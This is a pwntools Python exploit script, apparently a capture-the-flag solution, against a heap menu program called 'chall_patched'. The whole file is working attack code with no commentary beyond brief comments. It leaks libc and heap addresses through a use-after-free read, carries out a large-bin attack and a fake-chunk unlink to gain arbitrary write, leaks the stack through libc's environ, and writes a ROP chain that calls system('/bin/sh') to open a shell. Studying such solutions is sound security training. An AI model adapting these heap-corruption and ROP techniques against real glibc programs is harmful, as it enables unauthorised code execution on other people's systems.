#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

def create(idx, size):
    slna(b'> ', 1)
    slna(b'Enter index of slab: ', idx)
    slna(b'Enter size of slab: ', size)

def read_lab(idx):
    slna(b'> ', 2)
    slna(b'Enter index of slab: ', idx)
    p.recvuntil(b'Content of Slab:\n')

def write_lab(idx, content):
    slna(b'> ', 3)
    slna(b'Enter index of slab: ', idx)
    s(content)

def delete(idx):
    slna(b'> ', 4)
    slna(b'Enter index of slab: ', idx)

create(0, 0x650)
create(1, 0x500)
create(2, 0x640)


# 0 in large bins

delete(0)
read_lab(0)

libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x21ace0
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

create(3, 0x700)
write_lab(3, b'A'*0x700)
# second large bin chunk
delete(2)

# leak heap base
load = flat(
    b'A'*0x10
)

write_lab(0, load)
read_lab(0)

p.recvuntil(load)
heap_leak = u64(p.recv(4) + b'\0'*4)
heap_base = heap_leak - 0x290
info(f'heap leak: {hex(heap_leak)}')
info(f'heap base: {hex(heap_base)}')

main_arena = libc.address + 0x21b160
control_heap = heap_base +0xe10

# fake bk_nextsize to overwrite size_lab -> heap overflow
load = flat(
    p64(main_arena)*2,
    control_heap,
    0x4040e8 - 0x20 + 4
)

write_lab(0, load)

# set max-visualize-chunk-size 0x100
# push idx: 2 to large bins
create(4, 0x700)

slab = 0x404078
load = flat(
    0,
    0x701,
    slab - 0x18,
    slab - 0x10
)
load = load.ljust(0x700, b'\0')
load += flat(
    0x700,
    0x710
)
write_lab(3, load)

delete(4)

write_lab(3, p64(libc.sym.environ))

read_lab(0)

stack_leak = u64(p.recv(8))
info(f'stack leak: {hex(stack_leak)}')
rip = stack_leak - 0x150
write_lab(3, p64(rip))
pop_rdi = 0x000000000002a3e5 + libc.address
load = flat(
    pop_rdi+1,
    pop_rdi,

    next(libc.search(b'/bin/sh')),
    libc.sym.system
)

write_lab(0, load)

p.interactive()
